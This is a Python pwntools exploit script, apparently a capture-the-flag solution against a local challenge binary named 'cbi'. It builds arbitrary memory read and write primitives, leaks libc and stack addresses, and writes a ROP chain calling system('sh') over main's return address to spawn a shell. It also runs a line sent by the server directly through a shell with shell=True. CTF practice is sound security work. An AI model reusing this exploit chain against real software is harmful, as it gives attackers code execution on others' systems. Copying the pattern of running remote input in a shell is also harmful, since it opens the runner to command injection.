from pwn import *
from subprocess import check_output

libc = ELF("./libc.so.6", checksec=False)

#p = gdb.debug(["./ld-linux-x86-64.so.2", "./chal/src/cbi", "./chal/src/test/calc.bf"], gdbscript="c", env={'LD_PRELOAD': './libc.so.6'})
#p = process(["docker", "exec", "-i", "4", "/app/run"])
p = remote('localhost', 5000)
p.recvline()
res = check_output(p.recvline(), shell=True)
p.sendline(res)
print(p.recvline())


def write_byte(byte, addr: int):
    if isinstance(byte, bytes):
        byte = byte[0]
    assert 0 <= byte < 256
    addrbs = p64(addr)
    for i in range(8):
        p.sendline((f'0#{addrbs[i]}').encode())
        p.sendline(f'{i}p0'.encode())
        p.recvline()
        p.readline()
    p.sendline(f'0#{byte}'.encode())
    p.sendline(f'0p-124'.encode())
    p.readline()
    p.recvline()


def write_qword(data: int, addr: int):
    assert 0 <= data < (2**64)
    for i in range(8):
        write_byte(data & 0xff, addr+i)
        data >>= 8


def read_byte(addr: int):
    addrbs = p64(addr)
    for i in range(8):
        p.sendline((f'0#{addrbs[i]}').encode())
        p.sendline(f'{i}p0'.encode())
        p.recvline()
        p.readline()
    p.sendline(f'0g-124'.encode())
    return int(p.readline()[:-1].split(b" ")[-1])


def read_qword(addr: int):
    total = ''
    for i in range(8):
        total = hex(read_byte(addr+i) % 256)[2:].rjust(2, '0') + total
    return int(total, 16)

libc_leak = read_qword(0x405020)-0x89CD0 # subtracting libc.sym['putchar'] not working idk why

print('libc:', hex(libc_leak))

assert libc_leak > 0, "run again idk why it break"
system_addr = libc_leak+libc.sym['system']
sh_str_addr = 0x405aca

stack_leak = read_qword(libc_leak+0x2046e0)-0x120  # return ptr of main
print('stack:', hex(stack_leak))

pop_rdi_ret = libc_leak+0x10f75b
ret = libc_leak+0x2882f

write_qword(u64(b'sh\x00\x00\x00\x00\x00\x00'), 0x405aca)

write_qword(pop_rdi_ret, stack_leak)
write_qword(sh_str_addr, stack_leak+8)
write_qword(ret, stack_leak+16)
write_qword(system_addr, stack_leak+24)

p.interactive()

